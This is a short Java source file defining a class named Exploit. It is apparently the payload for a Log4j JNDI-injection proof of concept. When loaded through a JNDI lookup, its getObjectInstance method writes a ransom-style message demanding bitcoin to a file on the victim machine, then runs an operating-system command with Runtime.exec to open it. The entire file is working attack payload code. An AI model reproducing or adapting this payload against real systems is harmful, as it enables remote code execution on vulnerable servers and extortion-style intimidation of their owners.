package xyz.bumbing.log4j;

import javax.naming.Context;
import javax.naming.Name;
import java.io.File;
import java.io.IOException;
import java.io.FileOutputStream;
import java.nio.charset.StandardCharsets;
import java.util.Hashtable;

public class Exploit implements javax.naming.spi.ObjectFactory{
    @Override
    public Object getObjectInstance(Object o, Name name, Context context, Hashtable<?, ?> hashtable) throws Exception {

        try {
            new File("/Users/hanbeomhee/test").createNewFile();
            String msg = "your computer has our virus. if you want to recover your computer, send bitcoin our wallet";
            FileOutputStream fileOutputSteam = new FileOutputStream(new File("/Users/hanbeomhee/test"));
            StringBuilder sb = new StringBuilder();
            sb.append(o.toString()).append("\n");
            sb.append(name).append("\n");
            sb.append(msg);
            fileOutputSteam.write(sb.toString().getBytes(StandardCharsets.UTF_8));
            fileOutputSteam.close();
        } catch (IOException e) {
            e.printStackTrace();
        }
        Runtime.getRuntime().exec("open /Users/hanbeomhee/test");

        return null;
    }

}

